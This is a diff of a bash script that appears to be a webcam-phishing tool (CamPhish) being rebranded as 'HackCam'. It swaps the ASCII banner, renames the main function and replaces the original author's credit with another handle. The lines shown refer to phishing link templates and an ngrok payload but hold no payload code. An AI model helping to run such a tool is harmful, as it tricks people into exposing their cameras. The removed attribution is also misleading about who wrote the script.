@@ -3,17 +3,14 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"
+printf "\e[1;93m   _    _            _     _____                \e[0m\n"
+printf "\e[1;93m  | |  | |          | |   / ____|               \e[0m\n"
+printf "\e[1;93m  | |__| | __ _  ___| | _| |     __ _ _ __ ___  \e[0m\n"
+printf "\e[1;93m  |  __  |/ _` |/ __| |/ / |    / _` | '_ ` _ \ \e[0m\n"
+printf "\e[1;93m  | |  | | (_| | (__|   <| |___| (_| | | | | | |\e[0m\n"
+printf "\e[1;93m  |_|  |_|\__,_|\___|_|\_\\_____\__,_|_| |_| |_|v1.1\e[0m\n"
 
-printf " \e[1;77m SCRIPT CREATED BY MOHAMMAD AIJAZ \e[0m \n"
-
+printf " \e[1;92m Coded By V1CK3Y2 \e[0m \n"
 printf "\n"
 
 
@@ -137,7 +134,7 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+hackcam
 else
 printf "\n-----SELECT A TEMPLATE----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m FESTIVAL WISHING\e[0m\n"
@@ -208,7 +205,7 @@ payload_ngrok
 checkfound
 }
 
-camphish() {
+hackcam() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -231,7 +228,7 @@ else
 printf "\e[1;93m [!] INVALID OPTION!\e[0m\n"
 sleep 1
 clear
-camphish
+hackcam
 fi
 
 }
@@ -275,4 +272,4 @@ checkfound
 
 banner
 dependencies
-camphish
+hackcam
